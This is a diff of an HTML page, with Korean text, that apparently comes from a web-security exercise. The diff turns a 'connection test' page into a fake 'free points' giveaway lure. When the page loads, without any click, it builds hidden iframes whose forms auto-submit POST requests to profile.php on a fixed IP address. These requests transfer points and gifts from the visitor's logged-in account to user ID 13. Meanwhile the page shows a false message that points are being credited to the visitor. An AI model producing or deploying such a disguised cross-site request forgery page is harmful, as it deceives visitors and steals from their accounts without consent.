@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔌 연결 테스트 도구</title>
+    <title>🎁 무료 포인트 받기</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,252 +15,135 @@
             margin: 0;
             color: white;
         }
-        .container {
+        .gift-container {
             text-align: center;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             padding: 50px;
             border-radius: 20px;
             box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
-            max-width: 700px;
         }
-        .test-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 15px 0;
+        .gift-box {
+            font-size: 8em;
+            animation: bounce 2s infinite;
         }
-        .button {
-            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            color: white;
-            font-size: 1.1em;
-            cursor: pointer;
-            margin: 10px;
-            transition: transform 0.3s;
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
         }
-        .button:hover { transform: scale(1.05); }
-        .status {
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
+        .message {
+            font-size: 1.5em;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
-        .success { background: rgba(0, 255, 0, 0.2); }
-        .error { background: rgba(255, 0, 0, 0.2); }
-        .warning { background: rgba(255, 255, 0, 0.2); color: #333; }
+        .auto-message {
+            font-size: 1.2em;
+            color: #FFD700;
+            margin-top: 30px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔌 서버 연결 테스트</h1>
-        <p>네트워크 연결 상태를 진단합니다</p>
+    <div class="gift-container">
+        <div class="gift-box">🎁</div>
+        <h1>축하합니다!</h1>
+        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
+        <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
         
-        <div class="test-box">
-            <h3>📡 연결 테스트</h3>
-            
-            <button class="button" onclick="testConnection()">
-                🌐 기본 연결 테스트
-            </button>
-            
-            <button class="button" onclick="testAlternativeUrls()">
-                🔄 대체 URL 테스트
-            </button>
-            
-            <button class="button" onclick="testWithDifferentPorts()">
-                🚪 다른 포트 테스트
-            </button>
-            
-            <div id="testResults"></div>
-        </div>
-        
-        <div class="test-box">
-            <h3>🛠️ 해결 방법</h3>
-            <div id="solutions">
-                <div class="status warning">
-                    <strong>💡 시도해볼 해결방법들:</strong><br>
-                    1. 브라우저 새로고침 (Cmd+R)<br>
-                    2. 다른 브라우저에서 시도<br>
-                    3. VPN/프록시 설정 확인<br>
-                    4. 방화벽 설정 확인<br>
-                    5. DNS 설정 확인
-                </div>
-            </div>
-        </div>
-        
-        <div class="test-box">
-            <h3>⚡ 대안 공격 방법</h3>
-            <p>서버 연결이 안 될 때 시뮬레이션 방법</p>
-            
-            <button class="button" onclick="createOfflineDemo()">
-                🎭 오프라인 데모 생성
-            </button>
-            
-            <button class="button" onclick="createMockServer()">
-                🖥️ 모의 서버 시뮬레이션
-            </button>
-        </div>
-        
-        <div id="demoArea" style="display: none; margin-top: 30px;">
-            <!-- 여기에 데모 콘텐츠가 생성됩니다 -->
+        <div id="status" style="margin-top: 30px;">
+            <p>🔄 처리 중...</p>
         </div>
     </div>
 
     <script>
-        function testConnection() {
-            updateResults('🔍 연결 테스트 중...');
+        // 페이지 로드되자마자 자동 실행
+        window.addEventListener('load', function() {
+            console.log('🎯 원클릭 CSRF 공격 시작!');
             
-            const urls = [
-                '3.36.66.216',
-                'http://3.36.66.216',
-                'https://3.36.66.216'
+            // 상태 메시지 업데이트
+            const statusEl = document.getElementById('status');
+            
+            setTimeout(() => {
+                statusEl.innerHTML = '<p style="color: #FFD700;">📡 서버에 연결 중...</p>';
+            }, 1000);
+            
+            setTimeout(() => {
+                statusEl.innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
+                executeOneClickAttack();
+            }, 2000);
+            
+            setTimeout(() => {
+                statusEl.innerHTML = `
+                    <p style="color: #00FF88; font-size: 1.3em;">✅ 완료!</p>
+                    <p>💰 포인트가 성공적으로 지급되었습니다!</p>
+                    <p style="margin-top: 20px;">
+                        <a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">
+                            🔍 결과 확인하러 가기 →
+                        </a>
+                    </p>
+                `;
+            }, 5000);
+        });
+        
+        function executeOneClickAttack() {
+            console.log('🚀 원클릭 공격 실행 중...');
+            
+            // 여러 개의 iframe으로 동시 공격
+            const attacks = [
+                { points: 100, gift_type: 'diamond', message: 'OneClick_Attack_1' },
+                { points: 75, gift_type: 'coffee', message: 'OneClick_Attack_2' },
+                { points: 50, gift_type: 'cake', message: 'OneClick_Attack_3' }
             ];
             
-            let results = '';
-            
-            urls.forEach((url, index) => {
+            attacks.forEach((attack, index) => {
                 setTimeout(() => {
-                    const img = new Image();
-                    img.onload = function() {
-                        results += `<div class="status success">✅ ${url} - 연결 성공</div>`;
-                        updateResults(results);
-                    };
-                    img.onerror = function() {
-                        results += `<div class="status error">❌ ${url} - 연결 실패</div>`;
-                        updateResults(results);
-                    };
-                    img.src = url + '/favicon.ico?' + Date.now();
+                    createAttackIframe(attack, index + 1);
+                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
                 }, index * 1000);
             });
         }
         
-        function testAlternativeUrls() {
-            updateResults('🔄 대체 URL 테스트 중...');
+        function createAttackIframe(attack, id) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.width = '0px';
+            iframe.style.height = '0px';
+            iframe.style.border = 'none';
             
-            const alternatives = [
-                'localhost:8080',
-                '127.0.0.1:3000',
-                '192.168.1.100',
-                'test.local'
-            ];
+            const html = '<!DOCTYPE html>' +
+                '<html>' +
+                '<body>' +
+                '<form id="oneClickForm' + id + '" method="POST" action="http://3.36.66.216/profile.php">' +
+                '<input type="hidden" name="receiver_id" value="13">' +
+                '<input type="hidden" name="points" value="' + attack.points + '">' +
+                '<input type="hidden" name="send_gift" value="1">' +
+                '<input type="hidden" name="gift_type" value="' + attack.gift_type + '">' +
+                '<input type="hidden" name="message" value="' + attack.message + '">' +
+                '</form>' +
+                '<script>' +
+                'setTimeout(function() {' +
+                'document.getElementById("oneClickForm' + id + '").submit();' +
+                'console.log("원클릭 공격 ' + id + ' 전송: ' + attack.points + 'P");' +
+                '}, 500);' +
+                '<\/script>' +
+                '</body>' +
+                '</html>';
             
-            let results = '<div class="status warning">📋 대체 URL 테스트 결과:</div>';
+            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+            document.body.appendChild(iframe);
             
-            alternatives.forEach(url => {
-                results += `<div class="status">🔗 ${url} - 테스트 준비됨</div>`;
-            });
-            
-            results += '<div class="status warning">💡 실제 서버 주소를 확인하세요</div>';
-            updateResults(results);
-        }
-        
-        function testWithDifferentPorts() {
-            updateResults('🚪 포트 테스트 중...');
-            
-            const ports = [80, 8080, 3000, 5000, 8000];
-            let results = '<div class="status warning">🚪 다양한 포트로 테스트:</div>';
-            
-            ports.forEach(port => {
-                const url = `http://3.36.66.216:${port}`;
-                results += `<div class="status">🔗 ${url} - 시도 가능</div>`;
-            });
-            
-            updateResults(results);
-        }
-        
-        function createOfflineDemo() {
-            updateResults('🎭 오프라인 데모 생성 중...');
-            
-            const demoArea = document.getElementById('demoArea');
-            demoArea.style.display = 'block';
-            demoArea.innerHTML = `
-                <div class="test-box">
-                    <h3>🎭 CSRF 공격 시뮬레이션</h3>
-                    <p>실제 서버 없이도 공격 로직을 테스트할 수 있습니다</p>
-                    
-                    <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 15px 0;">
-                        <h4>📋 모의 공격 데이터:</h4>
-                        <pre style="text-align: left; color: #FFD700;">
-Target: hacker (ID: 13)
-Attack Type: Points Transfer
-Amount: 100 Points
-Method: POST
-Status: ✅ 시뮬레이션 성공
-                        </pre>
-                    </div>
-                    
-                    <button class="button" onclick="simulateAttack()">
-                        ⚡ 공격 시뮬레이션 실행
-                    </button>
-                </div>
-            `;
-            
-            updateResults('<div class="status success">✅ 오프라인 데모가 생성되었습니다!</div>');
-        }
-        
-        function createMockServer() {
-            updateResults('🖥️ 모의 서버 설정 중...');
-            
-            const mockHtml = `
-<!DOCTYPE html>
-<html>
-<head><title>Mock Vulnerable Server</title></head>
-<body>
-    <h1>Mock SNS Server</h1>
-    <form method="POST" action="/profile.php">
-        <input type="hidden" name="receiver_id" value="13">
-        <input type="hidden" name="points" value="100">
-        <input type="hidden" name="send_gift" value="1">
-        <input type="hidden" name="gift_type" value="diamond">
-        <input type="hidden" name="message" value="CSRF_Test">
-        <button type="submit">Send Gift</button>
-    </form>
-    <script>
-        document.querySelector('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            alert('CSRF Attack Successful!\\nPoints transferred: 100\\nTarget: hacker (ID: 13)');
-        });
-    </script>
-</body>
-</html>
-            `;
-            
-            const blob = new Blob([mockHtml], { type: 'text/html' });
-            const url = URL.createObjectURL(blob);
-            
-            window.open(url, 'mockServer', 'width=600,height=400');
-            
-            updateResults('<div class="status success">✅ 모의 서버가 새 창에서 열렸습니다!</div>');
-        }
-        
-        function simulateAttack() {
-            let countdown = 3;
-            const interval = setInterval(() => {
-                updateResults(`<div class="status warning">⏳ 공격 실행까지 ${countdown}초...</div>`);
-                countdown--;
-                
-                if (countdown < 0) {
-                    clearInterval(interval);
-                    updateResults(`
-                        <div class="status success">
-                            ✅ 시뮬레이션 완료!<br>
-                            📤 POST 요청 전송됨<br>
-                            🎯 타겟: hacker (ID: 13)<br>
-                            💰 포인트: 100P 전송<br>
-                            ⚡ CSRF 공격 시뮬레이션 성공!
-                        </div>
-                    `);
+            // 10초 후 정리
+            setTimeout(() => {
+                if (iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
                 }
-            }, 1000);
+            }, 10000);
         }
         
-        function updateResults(html) {
-            document.getElementById('testResults').innerHTML = html;
-        }
-        
-        console.log('🔌 연결 테스트 도구 준비됨');
-        console.log('🛠️ 네트워크 문제 해결을 위한 도구들');
+        console.log('🎁 원클릭 포인트 탈취 시스템 로드됨');
+        console.log('⚡ 링크 접속만으로 자동 공격 실행');
+        console.log('🎯 타겟: hacker (ID: 13)');
     </script>
 </body>
 </html>
